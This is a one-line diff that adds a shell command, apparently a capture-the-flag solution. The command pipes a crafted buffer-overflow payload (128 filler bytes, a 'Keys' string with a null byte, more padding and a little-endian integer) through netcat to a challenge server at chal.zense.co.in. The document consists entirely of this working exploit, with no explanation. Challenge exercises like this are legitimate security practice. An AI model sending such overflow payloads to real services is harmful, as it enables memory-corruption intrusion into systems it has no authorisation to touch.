@@ -1,0 +1,1 @@
+python3 -c "print('A'*128+'Keys\0'+'A'*11+'\x01\x00\x00\x00')" | nc chal.zense.co.in 6702
